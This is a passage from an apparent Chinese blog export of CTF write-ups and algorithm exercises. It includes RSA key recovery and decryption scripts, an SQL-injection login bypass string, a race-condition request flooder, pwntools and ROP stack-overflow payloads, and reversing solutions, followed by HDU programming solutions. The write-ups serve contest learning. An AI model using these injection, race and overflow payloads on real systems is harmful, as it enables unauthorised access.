:3 :3 : : 2: : :47: :2 : 0:5 : : : d: 6:83: : : :c7: : :0b: : : c: :3 :8 : :9 :4 : 7:5 :c0:fe: :f9: 1: :0 : e: 8:02: : f: :c :55:61""")_, dqmask_msk, dqmask_val = msk("""\ :0b:7 :4 :0 : 0:6 : 7:7e: : 5: : 7: : a:a :d : 0: 6: 4:86: : :8 : : : : :e :8f: 9: : : : 1: :2 : : 7: b:1 :5 : f: :8 : :d :21: :e : d: :c9:e : b: : :1 : : : :d :a2:b7: : : :f3: :42: :e : c: :f : : 0:f :7 : 4: 5:34: :4 : c: : :8 :d : 8:5 :af: 3:1d: 5:4 : :2 : :6 :c : 6:a :1 :5 : a:9 : :d : : :0a:a1: :f :7 :9 :b : : : f:2 :27: f: :0 :f6:4d: : : : : :5 : : 4:08: : 5: : 8: 5: : : :18: 4: 8:57: 2: f: a: : :a8: f: c:f : e: 1:9 :c : 4:9 : : : : : : : 1: :2 : :d1: : 6:e : d: : : f:04:2 :8d: : 3: : :b : 8: :d6: : 2: : : :6 : : f: : : 0:6 : :51: :48:19: : : :69:4 : c: :c : : f: :f4:d : : f: d:0 :0d:b :3 : 3:2 : : :6 : b:5 :2 : : c: 1:5a: f:f : : :7e:3e: :d :f :0 : d: c: 6: 1""")E = 0x10001def search(K, Kp, Kq, check_level, break_step): max_step = 0 cands = [0] # 广搜队列 for step in range(1, break_step + 1): # step代表复原倒数第step步 max_step = max(step, max_step) mod = 1 &lt;&lt; (4 * step) mask = mod - 1 cands_next = [] for p, new_digit in product(cands, p_ranges[-step]): pval = (new_digit &lt;&lt; ((step - 1) * 4)) | p # 四个剪枝 if check_level &gt;= 1: qval = solve_linear(pval, N &amp; mask, mod) if qval is None or not check_val(qval, mask, qmask_msk, qmask_val): continue if check_level &gt;= 2: val = solve_linear(E, 1 + K * (N - pval - qval + 1), mod) if val is None or not check_val(val, mask, dmask_msk, dmask_val): continue if check_level &gt;= 3: val = solve_linear(E, 1 + Kp * (pval - 1), mod) if val is None or not check_val(val, mask, dpmask_msk, dpmask_val): continue if check_level &gt;= 4: val = solve_linear(E, 1 + Kq * (qval - 1), mod) if val is None or not check_val(val, mask, dqmask_msk, dqmask_val): continue if pval * qval == N: #得到答案 print("Kq =", Kq) print("pwned") print("p =", pval) print("q =", qval) p = pval q = qval d = inverse(E, (p - 1) * (q - 1)) print("d =", d) coef = inverse(p, q) from Crypto.PublicKey import RSA print(RSA.construct((N, E, d, p, q, coef)).exportKey().decode()) quit() cands_next.append(pval) if not cands_next: return False cands = cands_next return Truedef check_val(val, mask, mask_msk, mask_val): test_mask = mask_msk &amp; mask test_val = mask_val &amp; mask return val &amp; test_mask == test_valfor K in range(1, E): if K % 100 == 0: print("checking", K) if search(K, 0, 0, check_level=2, break_step=20): print("K =", K) breakfor Kp in range(1, E): if Kp % 1000 == 0: print("checking", Kp) if search(K, Kp, 0, check_level=3, break_step=30): print("Kp =", Kp) breakfor Kq in range(1, E): if Kq % 100 == 0: print("checking", Kq) if search(K, Kp, Kq, check_level=4, break_step=9999): print("Kq =", Kq) break 然后使用openssl进行解密，此处加密填充方式使用的是OAEP padding方式，所以解密时应该注意： 1openssl rsautl -decrypt -inkey private.pem -keyform PEM -in flag.enc -oaep 或者写脚本： 12345678910111213141516# coding=utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPfrom Crypto.Util import numberwith open('pubkey.pem', 'rb') as f: key = RSA.importKey(f.read()) N = key.n e = key.ewith open('private.pem', 'rb') as f: private = RSA.importKey(f.read()) oaep = PKCS1_OAEP.new(private)with open('flag.enc', 'rb') as f: print(oaep.decrypt(f.read()).decode()) Openssl使用openssl命令 查看公钥pem信息 1openssl rsa -in pubkey.pem -pubin -text -modulus 利用生成私钥解密 1openssl rsautl -decrypt -inkey pkey -in flag.enc -out out.txt 生成私钥 1openssl asn1parse -genconf [config file] -out newkey.der 更多 Medium RSA——Jarvis OJ方法一解压后发现了两个文件，一个.pem文件，一个.enc文件 12RSA Public-Key: (256 bit) Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 65537 (0x10001) Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgMBAAE= -----END PUBLIC KEY----- 使用yafu对模数进行分解得到 12p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 解密脚本： 123456789101112131415#coding=utf-8import rsaimport gmpye = 65537n = 87924348264132406875276140514499937145050893665602592992418171647042491658461p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239fn = (p-1)*(q-1)d = int(gmpy.invert(e,fn))privateKey = rsa.PrivateKey(n,e,d,p,q) with open("flag.enc","rb") as f: print(rsa.decrypt(f.read(),privateKey).decode())#PCTF&#123;256b_i5_m3dium&#125; 方法二使用RSAtools或者脚本生成密钥文件，使用openssl解密， 私钥生成脚本: 1234567891011121314151617#coding=utf-8import mathfrom Crypto.PublicKey import RSAimport gmpy#生成一个1024位的私钥pri = RSA.generate(1024)pri.e = 65537pri.n = 87924348264132406875276140514499937145050893665602592992418171647042491658461pri.p = 275127860351348928173285174381581152299 pri.q = 319576316814478949870590164193048041239fn = (pri.p-1)*(pri.q-1)pri.d = int(gmpy.invert(pri.e,fn))private = open('private.pem','w')private.write(pri.exportKey())private.close() 使用 1openssl rsautl -decrypt -inkey private.pem -in flag.enc -out out.txt 得到PCTF{256b_i5_m3dium}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[learn_pwn]]></title>
    <url>%2F2019%2F10%2F16%2Flearn-pwn%2F</url>
    <content type="text"><![CDATA[Checksec 这是pwntools附带的一个工具，检测elf运行于哪个平台，开启了什么安全措施，如果用gcc的编译后，默认会开启所有的安全措施 1Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RELRO RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表 Stack 如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过 NX NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过 PIE PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 FORTIFY FORTIFY_SOURCE机制对格式化字符串有两个限制 (1)包含%n的格式化字符串不能位于程序内存中的可写地址。 (2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>learn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第十届极客大挑战]]></title>
    <url>%2F2019%2F10%2F15%2F%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%2F</url>
    <content type="text"><![CDATA[Web打比赛前先撸一只猫！ 直接传参： http://118.25.14.40:8110/?cat=dog 得到flag: Syc{I_actu4l1y_Lik3_d0gs} 你看见过我的菜刀么flag:Syc{Such_a_cl3ar_b0y} BurpSuiiiiiit!!!flag：Syc{BurpExtender_Are_guns_F0r_Hack3rs} Easysql 简单sql注入，试试万能密码：用户名：admin&#39; or &#39;1&#39;=&#39;1&#39; or &#39;1&#39;=&#39;1&#39; # 密码随意 得到Syc{sqL_inj3cti0n_1s_re4lly_fUn} 性感潇文清，在线算卦 查看源码: 123456789101112131415161718192021222324252627282930313233343536 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Ayrain&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="123.css"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="login"&gt; &lt;h4&gt;性感潇文清在线算卦&lt;/h4&gt; &lt;form method="get"&gt; &lt;input type="text" required="required" placeholder="your name" name="u"&gt;&lt;/input&gt; &lt;input type="password" required="required" placeholder="your birthday" name="p"&gt;&lt;/input&gt; &lt;button class="but" type="submit"&gt;算一卦！&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--$savepath = "uploads/" . sha1($_SERVER['REMOTE_ADDR']) . "/"; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath); umask($oldmask); &#125; if ((@$_GET['u']) &amp;&amp; (@$_GET['p'])) &#123; $content = '***************'; file_put_contents("$savepath" . sha1($_GET['u']), $content); $msg = 'Ding!你的算卦结果就在这儿啦！ ' . $savepath . htmlspecialchars(sha1($_GET['u'])) . ""; echo $msg; usleep(100000); @$content = "you are too slow"; file_put_contents("$savepath" . sha1($_GET['u']), $content); &#125;试试条件竞争吧？--!&gt; 先学一下条件漏洞先： 条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 1234567891011121314151617181920212223242526# -*- coding: utf-8 -*-import requestsimport hashlibimport threadingurl = "http://148.70.59.198:42534/?u=1&amp;p=1"u = "http://148.70.59.198:42534/uploads/4380dd7bb88ea8bc28acb3f48a4876b857062618/" + hashlib.sha1(b'1').hexdigest()def getflag(): while True: for j in range(50): requests.get(url) for j in range(50): res = requests.get(u) if "slow" not in res.text: print(res.text)threads = 25if __name__ == "__main__": for i in range(threads): t = threading.Thread(target=getflag) t.start() for i in range(threads): t.join() Misc签到Syc{w3lc0me_t0_th3_10th_geek!} 啊啊啊啊啊啊啊！！！我好兴奋！！！ 这个我觉得很有问题，别人说直接在winhex中可以看到，但我这看不见 Syc{Do_You_know_Ayrain} 散打黑客的压缩包 我拼着生命危险从散打黑客的电脑里偷来的压缩包，大家快跟我一起破解开。看看藏着什么东西。 下载下来有一个压缩包，被加密了，使用暴力破解，得到密码为：3130 随后解压，得到另外一个压缩包，还是被加密了，同样用工具进行解密，得到密码7665 解压后，得到一个txt文件： 1234567891011好吧，其实我已经提前破解掉了。由于看到了散打黑客的秘密，我感觉我迟早要被灭口。为了让我发现的秘密能够安全传给下一个人，我决定把这个秘密用数字的方式藏起来。（这个秘密是关于散打黑客的一件特别想要拥有的东西）什么？你不想知道散打黑客秘密，你只想要flag？哎呀，别急嘛。先听我说完，flag会有的。第一个找到我藏起来的散打黑客想要的东西。并且截图发给我的geeker，我请ta豁奶茶！校外的师傅我给你点外卖！（截了图却找不到我的qq号？那就很可惜了23333）咳咳，我的话说完了。去最下面拿你的flag吧少年！！！ 得到Syc{Weak_passwd_are_DANGER0us} 是谁杀了谁 注意自己的HP，别被气死了。 PwnFind tools Find right tools，so easy！nc pwnto.fun 9999 打开连接，看到： 123456Hi boys, this game may be a new things for u. Have fun! I think U will love it! So fun, so easy! The key is : #此处停顿了一下，可能有输出 pwntools is a good tool to complete the game! Can U get password? Input your password: 题目说find tools，里面说pwntools是好工具，现在就可以写脚本捕获输出 123456789101112#coding=utf-8from pwn import *context.log_level = "debug"io = remote("pwnto.fun", 9999)io.recvuntil("The key is :\n")str = io.recvuntil("\rpwntools")#bDF2ZV9sMG5nX2FuZF9wd24=#l1ve_l0ng_and_pwnio.recv() 现在就得到一段字符串，发现是base64加密，这个就是password，输入password，getflag 完整脚本： 12345678910111213141516#coding=utf-8from pwn import *import base64context.log_level = "debug"io = remote("pwnto.fun", 9999)#bDF2ZV9sMG5nX2FuZF9wd24=#l1ve_l0ng_and_pwnio.recvuntil("The key is :\n")str = io.recvuntil("\rpwntools")str = base64.b64decode(str)io.recv()io.send(str)io.interactive() 得到flag:Syc{pwn_1s_s0_fun} Baby rop下载文件分析一下安全设置： 没有打开栈溢出保护，用ida64打开看看源程序： 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+0h] [rbp-88h] puts(msg); puts(txt); read(0, &amp;v4, 0x100uLL); return puts(msa);&#125; 存在read函数，所以可以考虑进行栈溢出,查看.data表 由于是静态地址，所以直接使用相应地址,但传参还是使用ROP链进行传参 1234567891011121314╰─○ ROPgadget --binary ./hello --only "pop|ret"Gadgets information============================================================0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400690 : pop r14 ; pop r15 ; ret0x0000000000400692 : pop r15 ; ret0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400520 : pop rbp ; ret0x0000000000400693 : pop rdi ; ret #可用0x0000000000400691 : pop rsi ; pop r15 ; ret0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400451 : ret 找到一个rdi可用，脚本如下： 12345678#coding=utf-8from pwn import *sh = remote("nc pwnto.fun",10000)payload = 'a'*0x88+'a'*0x8+p64(0x06010AE)sh.send(payload)sh.interactive()sh.close() 得到flag:Syc{S0_easy_and_S0_good} Baby Shellcode 打CSGO，它不香吗？P90 rush b, let&#39;s go. checksec一下： 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 开启了Full RELRO，无法修改got表，NX保护开启，也就是栈中数据不能执行，可以尝试使用rop进行绕过 用ida打开，查看main函数： 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+0h] [rbp-30h] void *buf; // [rsp+28h] [rbp-8h] buf = mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL); sub_400999(1191936LL, 4096LL); sub_400956(); puts("A simple shellcode for U, have fun!"); read(0, buf, 0x64uLL); puts("Why not play CSGO?"); read(0, &amp;v4, 0x64uLL); return 0LL;&#125; mmap可以实现内存共享，那么，我们可以将shellcode写入buf里面， REjiang’s fan 密码都记错？你个假粉丝！！使用ida打开，找到Syc{I_am_4_fan_of_Ji@ng} secret用ida打开，然后发现一行编码： 5379637B6E30775F794F755F6B6E6F775F6234736531367D 像个加密形式，试着解密，开始使用base64进行解码，发现不行，后来使用hex解码得到Syc{n0w_yOu_know_b4se16} Easy VB 我的IDA怎么不能F5了,这可怎么办啊? file一下 1Easy VB.exe: PE32 executable (GUI) Intel 80386, for MS Windows 用ida打开，发现只有一个函数， 冰菓 千反田不小心把重要的东西落在了古典文学社，你能帮她找到吗？ 点开界面，发现： 说点他有惊喜，点几次发现： 使用这个工具进行逆向，找到关键加密函数: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556using System;using System.Text;namespace Bingo&#123; // Token: 0x02000006 RID: 6 public class EncryptStr &#123; // Token: 0x06000013 RID: 19 RVA: 0x00002424 File Offset: 0x00000624 public bool CheckStr(string text) &#123; if (text.Length != 20) &#123; return false; &#125; byte[] bytes = Encoding.ASCII.GetBytes(text); byte[] array = new byte[] &#123; 119, 77, 103, 79, 21, 115, 133, 97, 115, 87, 22, 115, 103, 89, 88, 93, 22, 89, 119, 81 &#125;; byte[] array2 = new byte[] &#123; 57, 13 &#125;; for (int i = 0; i &lt; array.Length; i++) &#123; bytes[i] = Convert.ToByte((int)((bytes[i] ^ array2[0]) + array2[1])); if (bytes[i] != array[i]) &#123; return false; &#125; &#125; return true; &#125; &#125;&#125; 将此函数进行逆向就可得到flag 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;int main()&#123; int array[20] = &#123;119,77,103,79,21,115,133,97,115,87,22,115,103,89,88,93,22,89,119,81&#125;; int array2[2] = &#123;57,13&#125;; int enc[20]; for(int i = 0 ; i &lt; 20 ; i++) &#123; enc[i] = (array[i]-array2[1])^array2[0]; &#125; for(int i = 0 ; i &lt; 20 ; i++) &#123; printf("%c",enc[i]); &#125; printf("\n"); return 0;&#125; flag:Syc{1_Am_s0_curi0uS} PYC是啥子嘛? 听说py不需要逆向，那pyc呢，pyc是什么呢？ 在线工具逆向： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycprint 'This is a maze.'print 'Python is so easy.'print 'Plz Input The Shortest Way:'maze = '###########S #@@@@@@##@ #@ ####@ ##@ #@@@ @#@ ##@ ####@#@ ##@ @@@@@#@ #########@ ##E######@ ##@ @@@@@ @ @ ###########'way = raw_input()len = len(way)p = 11#$$$$$$for i in way: if i == '&amp;': p -= 10 if i == '$': p += 10 if i == '6': p -= 1 if i == '3': p += 1 if maze[p] == '#': print 'Your way is wrong' exit(0) break if maze[p] == '@': continue if maze[p] == 'E': print 'You do it,your flag is Syc\\&#123;+Your Input+\\&#125;.' exit(0) continueprint 'May be something wrong.' 逆向脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;stack&gt;#include&lt;queue&gt;#include&lt;string&gt;using namespace std;char maze[101] = "###########S#@@@@@@##@#@####@##@#@@@@#@##@####@#@##@@@@@@#@#########@##E######@##@@@@@@@@###########";int dir[4] = &#123; -10,10,1,-1 &#125;;int vis[100];queue&lt;char&gt; fa;bool check(int x)&#123; if (x &lt; 0 || x &gt; 99) return true; if (vis[x] == 1 || maze[x] == '#') return true; return false;&#125;void bfs()&#123; queue&lt;int&gt; q; memset(vis, 0, sizeof(vis)); int tm = 11; q.push(tm); vis[tm] = 1; while (!q.empty()) &#123; int tm1 = q.front(); q.pop(); int fl; for (int i = 0; i &lt; 4; i++) &#123; fl = tm1 + dir[i]; if (!check(fl)) &#123; q.push(fl); vis[fl] = 1; if (dir[i] == 10) fa.push('&amp;'); else if (dir[i] == -10) fa.push('$'); else if (dir[i] == -1) fa.push('6'); else if (dir[i] == 1) fa.push('3'); if (maze[tm1] == 'E') &#123; return; &#125; &#125; &#125; &#125;&#125;int main()&#123; bfs(); printf("key words:"); while (!fa.empty()) &#123; printf("%c", fa.front()); fa.pop(); &#125; return 0;&#125; 得到字符串$$$$33333&amp;&amp;666&amp;&amp;33333$$$$$$$6666666&amp; 所以flag为：Syc{$$$$33333&amp;&amp;666&amp;&amp;33333$$$$$$$6666666&amp;} AndriodSign_in用jadx-gui进行反编译： 找到关键代码： 1234567891011121314public void onClick(View view) &#123; if (view.getId() != R.id.button) &#123; return; &#125; if (Base64.encodeToString(this.ed.getText().toString().getBytes(), 2).equals(getResources().getString(R.string.sign_in)) != null) &#123; CharSequence charSequence = "Right"; this.tv.setText(charSequence); Toast.makeText(this, charSequence, 1).show(); return; &#125; this.tv.setText("Try again"); Toast.makeText(this, "False", 1).show(); &#125;&#125; getString函数通过id查找字符串,在resource文件查找 一段base64码，直接解密：Syc{Si9n_1n_I3_E4sy!} CodingDragon Quest 按照题目要求编写C语言程序 12345678910111213141516171819202122232425262728293031323334353637383940414243Program description:The brave initially has 100 HP and 0 LV. He will face 3 challenges before facing the BOSS. There are three monsters for each challenge. The number represents the attack power of the monster. The brave must choose one of them to challenge. Each challenge a monster, the brave will deduct the corresponding HP and raise the same number of levels. In order to challenge the BOSS, the LV of the brave must ≥ 60 and keep HP as much as possible.The following conditions:1. Brave can face BOSS printf("The brave still has %dHP left to face the BOSS",HP);2. The level of the brave will definitely be less than 60 printf("why don't give the brave a chance to level up...");3. The brave will definitely die on the way to upgrade printf("The brave died on the way to leveling...");4. The attack power of the monster is less than or equal to 0.(As long as the monster attack power is less than or equal to 0, only this one is output.) printf("The monster is too weak...");Input1:(Each row represents a challenge)30 90 3050 80 3040 90 20Output1:The brave still has 20HP left to face the BOSStip:num[0][0]=30--&gt;num[1][2]=30--&gt;num[2][2]=20,LV=30+30+20,HP=100-30-30-20Input2:(Each row represents a challenge)100 100 100100 100 100100 100 100Output2:The brave died on the way to leveling...Please input your code: 直接编程就行,注意一定是C语言，C++都不行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int num[3][3];int finmin(int* x)&#123; int min=x[0]; if(min &gt; x[1]) &#123; min = x[1]; &#125; else if(min &gt; x[2]) &#123; min = x[2]; &#125; return min;&#125;int main()&#123; memset(num,0,sizeof(num)); for(int i = 0 ; i &lt; 3 ; i++) &#123; for(int j = 0 ; j &lt; 3 ; j++) &#123; scanf("%d",&amp;num[i][j]); &#125; &#125; int level1 = finmin(num[0]); int level2 = finmin(num[1]); int level3 = finmin(num[2]); int hp = 100-level1-level2-level3; int lv = level1+level2+level3; if(level1&lt;= 0 || level2 &lt;= 0 || level3 &lt;= 0) &#123; printf("The monster is too weak..."); return 0; &#125; if(lv &lt; 60) &#123; printf("why don't give the brave a chance to level up..."); return 0; &#125; if(hp &lt;= 0) &#123; printf("The brave died on the way to leveling..."); return 0; &#125; else &#123; printf("The brave still has %dHP left to face the BOSS",hp); return 0; &#125;&#125;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Contest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HDU_Problem_exercise]]></title>
    <url>%2F2019%2F10%2F14%2FHDU-Problem-exercise%2F</url>
    <content type="text"><![CDATA[又开始捡起自己的算法练习篇~~ 1006 Tick and TickProblem Description 1The three hands of the clock are rotating every second and meeting each other many times everyday. Finally, they get bored of this and each of them would like to stay away from the other two. A hand is happy if it is at least D degrees from any of the rest. You are to calculate how much time in a day that all the hands are happy. Input 1The input contains many test cases. Each of them has a single line with a real number D between 0 and 120, inclusively. The input is terminated with a D of -1. Output 1For each D, print in a single line the percentage of time in a day that all of the hands are happy, accurate up to 3 decimal places. Sample Input 1234012090-1 Sample Output 123100.0000.0006.251 题意： 时钟的三个指针，在他们之间的角度大于D度时，可以认为是happy，求一天中的happy时间占的百分比 分析：由于12小时后，时针、分针、看到这个首先想到的追击与相遇问题，我们可以将时、分、秒针的速度统一单位，然后可以求出相对速度。得到相对速度之后单独对两个针分析(由于是三个角度都需要大于D)，由此得到两针相差一度所需要的时间，那么最晚达到D度和最早结束D度之间的区间时间就是happy-time，然后就考虑周期的问题，但最早结束的应该转到下一个满足条件状态（加上一个周期)。最后记得我们是勇12小时来计算的，即43200s 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;stdio.h&gt;double max(double a,double b,double c)&#123; return a&gt;b?(a&gt;c?a:c):(b&gt;c?b:c);&#125;double min(double a,double b,double c)&#123; return a&lt;b?(a&lt;c?a:c):(b&lt;c?b:c);&#125;int main()&#123; double d; //需要间隔的度数 double c_sm = 3600*1.0/59; double c_sh = 43200*1.0/719; double c_mh = 43200*1.0/11; //这三行是时针、分针、秒针相遇的周期 double sum; double happys,happye; //开始happy和结束happy double sm = 10*1.0/59; double sh = 120*1.0/719; double mh = 120*1.0/11; //这是相差一度需要的时间 double d_sm,d_sh,d_mh,not_d_sm,not_d_sh,not_d_mh;//表示相差d°及以上的时刻和不再相差d°及以上的时刻 while(~scanf("%lf",&amp;d)&amp;&amp;d!=-1)&#123; sum = 0; d_sm=sm*d; not_d_sm=c_sm-d_sm; d_sh=sh*d; not_d_sh=c_sh-d_sh; d_mh=mh*d; not_d_mh=c_mh-d_mh; happys=max(d_sm,d_sh,d_mh); happye=min(not_d_sm,not_d_sh,not_d_mh); //happy区间应该选择最晚开始的和最早结束的 while(happys&lt;=43200&amp;&amp;happye&lt;=43200)//43200是时针针转一圈的秒数 &#123; happys=max(d_sm,d_sh,d_mh);//两两之间最后一个满足相差d°及以上的条件视为开始happy时刻 happye=min(not_d_sm,not_d_sh,not_d_mh);//两两之间第一个不再满足相差d°及以上视为结束happy的时刻 if(happys&lt;happye) sum+=happye-happys;//如果end的时间比start的晚,由sum记录并累积 if(happye==not_d_sm) &#123;d_sm+=c_sm;not_d_sm+=c_sm;&#125; else if(happye==not_d_sh) &#123;d_sh+=c_sh;not_d_sh+=c_sh;&#125; else if(happye==not_d_mh) &#123;d_mh+=c_mh;not_d_mh+=c_mh;&#125;//happy时间end后最慢的指针要提前一个周期才能让比它快的再次追上 &#125; printf("%.3lf\n",sum/43200*100); &#125; return 0;&#125; 1007 Quoit DesignProblem Description 1234Have you ever played quoit in a playground? Quoit is a game in which flat rings are pitched at some toys, with all the toys encircled awarded.In the field of Cyberground, the position of each toy is fixed, and the ring is carefully designed so it can only encircle one toy at a time. On the other hand, to make the game look more attractive, the ring is designed to have the largest radius. Given a configuration of the field, you are supposed to find the radius of such a ring.Assume that all the toys are points on a plane. A point is encircled by the ring if the distance between the point and the center of the ring is strictly less than the radius of the ring. If two toys are placed at the same point, the radius of the ring is considered to be 0. Input 1The input consists of several test cases. For each case, the first line contains an integer N (2 &lt;= N &lt;= 100,000), the total number of toys in the field. Then N lines follow, each contains a pair of (x, y) which are the coordinates of a toy. The input is terminated by N = 0. Output 1For each test case, print in one line the radius of the ring required by the Cyberground manager, accurate up to 2 decimal places. Sample Input 123456789101120 01 121 11 13-1.5 00 00 1.50 Sample Output 1230.710.000.75 ​ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/*看完题目发现是个最近点对的问题 */#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;cmath&gt;using namespace std;int n;//定义点的结构体 struct Point&#123; double x; double y;&#125;pt[100007];int a[100007];//可以记录大概满足要求的点的下标 //对功能进行函数包装int cmp(Point a,Point b)&#123; if(a.x!=b.x) return a.x&lt;b.x; else return a.y&lt;b.y;&#125;int cmp_y(int i,int j)&#123; return pt[i].y&lt;pt[j].y;&#125; //获取距离 double getdis(Point &amp;a,Point &amp;b)&#123; return sqrt((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));&#125; double solve(int l,int r)&#123; double ans = 0; //只有两个点就直接输出 if(r-l &lt;= 2) &#123; //当两个点重合,返回0 if(r-l == 0) return ans; ans = getdis(pt[l],pt[l+1]); //当只有一个点时，返回ans if(r-l == 1) return ans; for(int i = l ; i &lt;= r ; i++)&#123; for(int j=i+1 ; j &lt;= r ; j++) &#123; ans = min(ans,getdis(pt[i],pt[j])); &#125; &#125; return ans; &#125; //剩下就是多个点的问题了 int m = (l+r)&gt;&gt;1; double temp1 = solve(l,m); double temp2 = solve(m+1,r); ans = min(temp1,temp2); //获取区间中的点，对y坐标进行排序 int k = 0; for(int i = l ; i &lt;= m &amp;&amp; pt[m].x -pt[i].x ; i++) a[k++] = i; for(int j = m+1 ; j &lt;= r &amp;&amp; pt[r].x-pt[j].x ; j++) a[k++] = j; sort(a,a+k,cmp_y); for(int i = 0 ; i &lt; k ; i++) &#123; for(int j = i+1 ; j &lt; k &amp;&amp; j &lt;= i+7 ; j++) &#123; ans = min(ans,getdis(pt[a[i]],pt[a[j]])); &#125; &#125; return ans; &#125;int main()&#123; while(~scanf("%d",&amp;n)&amp;&amp;n) &#123; for(int i = 0 ; i &lt; n ; i++) &#123; scanf("%lf%lf",&amp;pt[i].x,&amp;pt[i].y); &#125; sort(pt,pt+n,cmp); printf("%.2lf\n",solve(0,n-1)*1.0/2); &#125;&#125; 1008 ElevatorProblem Description 12The highest building in our city has only one elevator. A request list is made up with N positive numbers. The numbers denote at which floors the elevator will stop, in specified order. It costs 6 seconds to move the elevator up one floor, and 4 seconds to move down one floor. The elevator will stay for 5 seconds at each stop.For a given request list, you are to compute the total time spent to fulfill the requests on the list. The elevator is on the 0th floor at the beginning and does not have to return to the ground floor when the requests are fulfilled. Input 1There are multiple test cases. Each case contains a positive integer N, followed by N positive numbers. All the numbers in the input are less than 100. A test case with N = 0 denotes the end of input. This test case is not to be processed. Output 1Print the total time on a single line for each test case. Sample Input 1231 23 2 3 10 Sample Output 121741 题意 一个楼梯用于升降，第一个N数为请求数量，随后跟着N个请求，对于上升请求，每上一楼6秒，停5秒，对于下降请求，每下一楼4秒，停5秒。 代码 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main()&#123; int n; while(cin&gt;&gt;n&amp;&amp;n) &#123; int now_level = 0; int temp; int sum = 0; for(int i = 0 ; i &lt; n ; i++) &#123; cin&gt;&gt;temp; if(now_level &gt; temp) sum += (now_level-temp)*4 + 5; else sum += (temp - now_level)*6 + 5; now_level = temp; &#125; cout&lt;&lt;sum&lt;&lt;endl; &#125;&#125; 1009 FatMouse’ TradeProblem Description 12FatMouse prepared M pounds of cat food, ready to trade with the cats guarding the warehouse containing his favorite food, JavaBean.The warehouse has N rooms. The i-th room contains J[i] pounds of JavaBeans and requires F[i] pounds of cat food. FatMouse does not have to trade for all the JavaBeans in the room, instead, he may get J[i]* a% pounds of JavaBeans if he pays F[i]* a% pounds of cat food. Here a is a real number. Now he is assigning this homework to you: tell him the maximum amount of JavaBeans he can obtain. Input 1The input consists of multiple test cases. Each test case begins with a line containing two non-negative integers M and N. Then N lines follow, each contains two non-negative integers J[i] and F[i] respectively. The last test case is followed by two -1’s. All integers are not greater than 1000. Output 1For each test case, print in a single line a real number accurate up to 3 decimal places, which is the maximum amount of JavaBeans that FatMouse can obtain. Sample Input 1234567895 37 24 35 220 325 1824 1515 10-1 -1 Sample Output 1213.33331.500 题意 M吨猫粮， 分析 尝试贪心 代码 